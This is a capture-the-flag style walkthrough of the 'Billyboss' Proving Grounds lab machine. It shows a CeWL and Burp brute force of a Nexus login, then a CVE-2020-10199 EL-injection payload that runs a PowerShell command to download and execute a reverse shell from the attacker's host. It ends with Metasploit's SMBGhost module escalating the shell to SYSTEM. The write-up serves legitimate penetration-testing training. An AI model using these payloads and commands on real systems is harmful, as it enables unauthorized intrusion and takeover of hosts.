---
title: "PG: Billyboss"
date: 2023-03-07
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/billyboss/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - nexus
  - cve-2020-10199
  - weak-credentials
  - smbghost
  - cve-2020-0796
categories:
  - walkthrough
---

{{< box-info name="Billyboss" os="Windows" difficulty="Medium" ip="192.168.134.61" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

The two ports that matter — a Nexus web service and SMB:

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds
8081/tcp open  http          Sonatype Nexus Repository Manager OSS 3.21.0-05
```
{{< /collapse >}}

A Windows host with a web service on port **8081** — Sonatype **Nexus Repository Manager OSS 3.21.0-05**. SMB (445) is also exposed, which becomes relevant for privilege escalation later.

Nexus ships with a login form, so this is a two-part web attack: get in, then abuse the version.

### Port 8081 - Nexus Repository Manager

The login is the front door. Default creds (`admin:admin123`) didn't land, so rather than blindly throwing rockyou at it, build a wordlist from the application's own content with CeWL:

```bash
# lowercase words scraped from the app
cewl -d 10 -m 5 -w nexus_wl.txt http://192.168.134.61:8081/ --lowercase
# add the original-case words too
cewl -d 10 -m 5 http://192.168.134.61:8081/ -a >> nexus_wl.txt
```

The catch: Nexus doesn't POST credentials in cleartext. The `/service/rapture/session` endpoint expects each field **base64-encoded and then URL-encoded**. You can pre-bake the wordlist:

```bash
while read line; do echo -n "$line" | base64 >> b64_wl.txt; done < nexus_wl.txt
```

...or let Burp Intruder do it inline — Pitchfork across the `username`/`password` positions, CeWL list as the payload, with **Base64-encode** + **URL-encode key chars** stacked in Payload Processing.

---

## Foothold

### Weak credentials

The winning payload stands out immediately — `bmV4dXM%3d` (that's `nexus` base64'd + URL-encoded) returns **204** while every other request is a **403**:

![Burp Intruder brute force — the nexus payload returns 204 among a wall of 403s](/images/billyboss/creds.png)

Credentials: **`nexus:nexus`**.

### Nexus RCE — CVE-2020-10199

Nexus Repository Manager 3.21.0 is vulnerable to an authenticated remote code execution via EL injection ([EDB-49385](https://www.exploit-db.com/exploits/49385), CVE-2020-10199). The bug lives in the `memberNames` field of a repository-group create request, where a crafted expression breaks out into `java.lang.Runtime.exec()`.

Serve a Nishang `Invoke-PowerShellTcp.ps1` reverse shell over HTTP, then set the injected command to pull and execute it in memory:

```
'..getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec(
  'powershell.exe -nop -ep bypass -c IEX (IWR http://192.168.49.134:445/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'
)'
```

Start the listener, fire the exploit — shell lands as **`billyboss\nathan`**:

![whoami /all as billyboss\nathan showing SeImpersonatePrivilege enabled](/images/billyboss/whoami.png)

Note `SeImpersonatePrivilege` is **Enabled** — the obvious "potato / PrintSpoofer" tell. Worth logging, but it turned out to be a dead end on this box (PrintSpoofer refused to fire).

---

## Privilege Escalation

### SMBGhost — CVE-2020-0796

With PrintSpoofer out, fall back to a kernel exploit. Watson (bundled with the OffSec winPEAS build) flags the host — Windows 10 build **1903 (18362)** — as vulnerable to two CVEs:

![Watson output flagging CVE-2020-1013 (WSUS) and CVE-2020-0796 (SMBGhost) as VULNERABLE](/images/billyboss/winpeas.png)

WSUS (CVE-2020-1013) needs a man-in-the-middle position that isn't practical here, so **SMBGhost (CVE-2020-0796)** — the SMBv3.1.1 compression LPE — is the play. The build number matches exactly.

Fastest path is the Metasploit local module, run against the existing session:

```
msf6 exploit(windows/local/cve_2020_0796_smbghost) > set SESSION 3
msf6 exploit(windows/local/cve_2020_0796_smbghost) > set LHOST tun0
msf6 exploit(windows/local/cve_2020_0796_smbghost) > set LPORT 80
msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit

[+] The target appears to be vulnerable.
[*] Reflectively injecting the exploit DLL and executing it...
[+] Process 4732 launched.
[*] Meterpreter session 4 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The standalone [danigargu/CVE-2020-0796](https://github.com/danigargu/CVE-2020-0796) PoC also works, but it spawns `cmd.exe` — you'd need to patch the shellcode to a reverse-shell payload (msfvenom) since a bare PowerShell callback won't survive its default execution flow.

---

## Proof

SYSTEM, plus both flags:

![Meterpreter as NT AUTHORITY\SYSTEM on BILLYBOSS, reading proof.txt and local.txt](/images/billyboss/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- When default creds fail on an app-specific login, build a **CeWL wordlist from the app itself** before reaching for generic lists — the answer here (`nexus`) was scraped straight off the page.
- Watch the encoding layer: Nexus base64s + URL-encodes credentials, so raw wordlists silently fail. Bake the encoding into the payload (Burp Payload Processing) or pre-encode the list.
- `SeImpersonatePrivilege` is a tempting potato/PrintSpoofer target, but don't tunnel-vision on it — when it fails, pivot to what the vuln scanners actually confirmed.
- A precise **build number** (18362) turns a maybe into a yes for kernel bugs like SMBGhost (CVE-2020-0796). Always map the OS build to known LPEs.
{{< /callout >}}
